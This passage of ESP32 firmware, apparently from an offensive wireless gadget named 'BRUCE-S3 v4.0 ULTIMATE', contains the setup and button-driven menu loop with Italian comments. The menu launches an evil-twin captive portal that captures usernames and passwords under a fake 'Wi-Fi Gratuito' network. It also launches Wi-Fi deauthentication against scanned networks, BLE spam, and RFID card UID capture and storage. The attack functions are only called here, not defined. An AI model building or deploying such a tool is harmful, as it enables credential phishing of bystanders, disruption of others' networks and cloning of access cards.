      display.setCursor(10, 40);
      display.print("Status: ");
      display.println(wifiMultiBand ? "ENABLED" : "DISABLED");
      display.setCursor(0, 56);
      display.println("[OK] Toggle");
      break;
    }
  }

  display.display();
  needsUpdate = false;
}

// ============================================================================
// BUTTON HANDLING - ANTI-BOUNCE OTTIMIZZATO
// ============================================================================

bool consumeButtonPress(int pin, ButtonState &state) {
  bool reading = digitalRead(pin);

  if (reading != state.lastReading) {
    state.lastReading = reading;
    state.lastChange = millis();
  }

  if (millis() - state.lastChange >= debounceMs && reading != state.stableHigh) {
    state.stableHigh = reading;
    if (!state.stableHigh) {
      wakeScreen();
      return true;
    }
  }

  return false;
}

// ============================================================================
// SETUP
// ============================================================================

void setup() {
  Serial.begin(115200);

  xMutex = xSemaphoreCreateMutex();

  // Display
  Wire.begin(9, 8);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("Display failed!");
    for (;;);
  }

  // Filesystem
  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS failed!");
  } else {
    loadLastCreds();
  }

  // SPI per RFID
  SPI.begin(RFID_SCK, RFID_MISO, RFID_MOSI, RFID_SS);
  rfid.PCD_Init();
  loadRFIDCards();

  // Pulsanti
  pinMode(PIN_UP, INPUT_PULLUP);
  pinMode(PIN_DOWN, INPUT_PULLUP);
  pinMode(PIN_OK, INPUT_PULLUP);
  pinMode(PIN_ESC, INPUT_PULLUP);

  upButton.stableHigh = digitalRead(PIN_UP);
  upButton.lastReading = upButton.stableHigh;
  downButton.stableHigh = digitalRead(PIN_DOWN);
  downButton.lastReading = downButton.stableHigh;
  okButton.stableHigh = digitalRead(PIN_OK);
  okButton.lastReading = okButton.stableHigh;
  escButton.stableHigh = digitalRead(PIN_ESC);
  escButton.lastReading = escButton.stableHigh;

  // Sound sensor
  pinMode(SOUND_PIN, INPUT);
  analogSetAttenuation(ADC_11db);

  // WiFi Task
  xTaskCreatePinnedToCore(TaskWiFi, "WiFiTask", 4096, NULL, 1, NULL, 0);

  // Splash
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(10, 20);
  display.println("BRUCE-S3 v4.0");
  display.setCursor(20, 35);
  display.println("ULTIMATE");
  display.display();
  delay(1500);

  lastActivityTime = millis();
  needsUpdate = true;
}

// ============================================================================
// MAIN LOOP (Core 1)
// ============================================================================

void loop() {
  static uint32_t lastActionTime = 0;
  static uint32_t lastDrawTime = 0;

  // Check screen timeout
  if (!screenSleepEnabled && currentMode == MENU &&
      millis() - lastActivityTime > SCREEN_TIMEOUT) {
    screenSleepEnabled = true;
    display.ssd1306_command(SSD1306_DISPLAYOFF);
    needsUpdate = true;
  }

  // Button polling
  if (millis() - lastActionTime > 120) {

    if (consumeButtonPress(PIN_UP, upButton)) {
      switch (currentMode) {
        case MENU:
          menuIndex = (menuIndex - 1 + totalOptions) % totalOptions;
          break;
        case SCANNER:
          if (networksFound > 0) scanIndex = (scanIndex - 1 + networksFound) % networksFound;
          break;
        case BLE_SELECT:
          bleSelectIndex = (bleSelectIndex - 1 + 5) % 5;
          break;
        case KEYBOARD:
          kbChar = (kbChar == ' ') ? 'z' : kbChar - 1;
          if (kbChar < ' ') kbChar = 'z';
          break;
        case PORTAL:
          textScroll = max(0, textScroll - 1);
          break;
        case RFID_MENU:
          rfidMenuIndex = (rfidMenuIndex - 1 + 4) % 4;
          break;
        case RFID_LIST:
          if (savedCardsCount > 0) rfidCardIndex = (rfidCardIndex - 1 + savedCardsCount) % savedCardsCount;
          break;
        case SOUND_MENU:
          soundMenuIndex = (soundMenuIndex - 1 + 5) % 5;
          break;
      }
      needsUpdate = true;
      lastActionTime = millis();
    }

    else if (consumeButtonPress(PIN_DOWN, downButton)) {
      switch (currentMode) {
        case MENU:
          menuIndex = (menuIndex + 1) % totalOptions;
          break;
        case SCANNER:
          if (networksFound > 0) scanIndex = (scanIndex + 1) % networksFound;
          break;
        case BLE_SELECT:
          bleSelectIndex = (bleSelectIndex + 1) % 5;
          break;
        case KEYBOARD:
          kbChar = (kbChar == 'z') ? ' ' : kbChar + 1;
          if (kbChar > 'z') kbChar = ' ';
          break;
        case PORTAL:
          textScroll++;
          break;
        case RFID_MENU:
          rfidMenuIndex = (rfidMenuIndex + 1) % 4;
          break;
        case RFID_LIST:
          if (savedCardsCount > 0) rfidCardIndex = (rfidCardIndex + 1) % savedCardsCount;
          break;
        case SOUND_MENU:
          soundMenuIndex = (soundMenuIndex + 1) % 5;
          break;
      }
      needsUpdate = true;
      lastActionTime = millis();
    }

    else if (consumeButtonPress(PIN_OK, okButton)) {
      unsigned long pressStart = millis();
      while (digitalRead(PIN_OK) == LOW && millis() - pressStart < 2000) {
        delay(10);
      }
      long pressDuration = millis() - pressStart;

      switch (currentMode) {
        case KEYBOARD:
          if (pressDuration > 800) {
            custom_ssid = kbBuffer;
            if (custom_ssid == "") custom_ssid = "Wi-Fi Gratuito";
            currentMode = MENU;
          } else {
            if (kbBuffer.length() < 20) kbBuffer += kbChar;
          }
          break;

        case MENU:
          if (menuIndex == 0) startPortal(custom_ssid);
          else if (menuIndex == 3) {
            currentMode = KEYBOARD;
            kbBuffer = "";
            kbChar = 'A';
          }
          else if (menuIndex == 4) {
            currentMode = BLE_SELECT;
            bleSelectIndex = 0;
          }
          else if (menuIndex == 5) currentMode = VIEW_CREDS;
          else if (menuIndex == 6) {
            clearCreds();
            captured_user = "";
            captured_pass = "";
            display.clearDisplay();
            display.setCursor(15, 25);
            display.println("CREDS CLEARED!");
            display.display();
            delay(1000);
            currentMode = MENU;
          }
          else if (menuIndex == 7) {
            currentMode = RFID_MENU;
            rfidMenuIndex = 0;
          }
          else if (menuIndex == 8) {
            currentMode = SOUND_MENU;
            soundMenuIndex = 0;
          }
          else if (menuIndex == 9) {
            screenSleepEnabled = true;
            display.ssd1306_command(SSD1306_DISPLAYOFF);
          }
          else if (menuIndex == 10) {
            currentMode = WIFI_BANDS;
          }
          else {
            stopBleSpam();
            cleanNetworkState();
            WiFi.mode(WIFI_STA);
            networksFound = 0;
            needsUpdate = true;
            drawUI();
            networksFound = WiFi.scanNetworks();
            currentMode = SCANNER;
            scanIndex = 0;
          }
          break;

        case BLE_SELECT:
          startBleSpam((BleType)bleSelectIndex);
          break;

        case SCANNER:
          if (networksFound > 0) {
            if (menuIndex == 1) startPortal(WiFi.SSID(scanIndex));
            else if (menuIndex == 2) startDeauth(scanIndex);
          }
          break;

        case VIEW_CREDS:
          currentMode = MENU;
          break;

        case RFID_MENU:
          if (rfidMenuIndex == 0) {
            currentMode = RFID_SCAN;
            cardDetected = false;
          }
          else if (rfidMenuIndex == 1) {
            currentMode = RFID_LIST;
            rfidCardIndex = 0;
          }
          else if (rfidMenuIndex == 2) {
            deleteAllRFIDCards();
            display.clearDisplay();
            display.setCursor(10, 25);
            display.println("CARDS DELETED!");
            display.display();
            delay(1000);
            currentMode = RFID_MENU;
          }
          else currentMode = MENU;
          break;

        case RFID_SCAN:
          if (cardDetected) {
            addRFIDCard(scannedUID);
            display.clearDisplay();
            display.setCursor(20, 25);
            display.println("CARD SAVED!");
            display.display();
            delay(1000);
            currentMode = RFID_MENU;
          }
          break;

        case RFID_LIST:
          currentMode = RFID_MENU;
          break;

        case SOUND_MENU:
          if (soundMenuIndex == 0) {
            startSoundScan(5000);
            currentMode = SOUND_SCAN;
          }
          else if (soundMenuIndex == 1) {
            startSoundScan(10000);
            currentMode = SOUND_SCAN;
          }
          else if (soundMenuIndex == 2) {
            startSoundScan(20000);
            currentMode = SOUND_SCAN;
          }
          else if (soundMenuIndex == 3) {
            currentMode = SOUND_LIVE;
            // Reset completo buffer
            memset(soundBuffer, 2048, sizeof(soundBuffer)); // Centro a 2048 (metà range ADC)
            soundIndex = SOUND_SAMPLES; // Inizia con buffer pieno

            // Pre-riempi con valori centrali per evitare salto iniziale
            for (int i = 0; i < SOUND_SAMPLES; i++) {
              soundBuffer[i] = 2048;
            }
          }
          else currentMode = MENU;
          break;

        case SOUND_SCAN:
          if (!soundScanning) currentMode = SOUND_MENU;
          break;

        case SOUND_LIVE:
          currentMode = SOUND_MENU;
          break;

        case WIFI_BANDS:
          wifiMultiBand = !wifiMultiBand;
          needsUpdate = true;
          break;
      }

      needsUpdate = true;
      lastActionTime = millis();
    }

    else if (consumeButtonPress(PIN_ESC, escButton)) {
      switch (currentMode) {
        case KEYBOARD:
          if (kbBuffer.length() > 0) kbBuffer.remove(kbBuffer.length() - 1);
          else currentMode = MENU;
          break;
        default:
          stopBleSpam();
          cleanNetworkState();
          currentMode = MENU;
          break;
      }
      needsUpdate = true;
      lastActionTime = millis();
    }
  }

  // RFID scanning
  if (currentMode == RFID_SCAN && !cardDetected) {
    if (scanRFIDCard()) {
      cardDetected = true;
      needsUpdate = true;
    }
  }

  // Sound scanning
  if (currentMode == SOUND_SCAN && soundScanning) {
    updateSoundScan();
    needsUpdate = true;
  } else if (currentMode == SOUND_LIVE) {
    // Leggi multiple samples per frame per avere onde fluide
    for (int i = 0; i < 5; i++) {
      int reading = analogRead(SOUND_PIN);

      // DEBUG: Stampa ogni 50 letture
      static int debugCounter = 0;
      if (debugCounter++ % 50 == 0) {
        Serial.print("Sound reading: ");
        Serial.println(reading);
      }

      // Shift buffer a sinistra
      for (int j = 0; j < SOUND_SAMPLES - 1; j++) {
        soundBuffer[j] = soundBuffer[j + 1];
      }
      soundBuffer[SOUND_SAMPLES - 1] = reading;

      delayMicroseconds(100); // Piccolo delay tra campioni
    }
    needsUpdate = true;
  }

  // BLE spam
  if (currentMode == BLE_SPAM) {
    runBLESpam();
  }

  // Update display
  if (needsUpdate ||
      (currentMode == DEAUTH && millis() - lastDrawTime > 250) ||
      (currentMode == BLE_SPAM && millis() - lastDrawTime > 250) ||
      (currentMode == SOUND_LIVE && millis() - lastDrawTime > 50) ||  // 20 FPS per audio live
      (currentMode == SOUND_SCAN && millis() - lastDrawTime > 100)) {
    drawUI();
    lastDrawTime = millis();
  }

  yield();
}
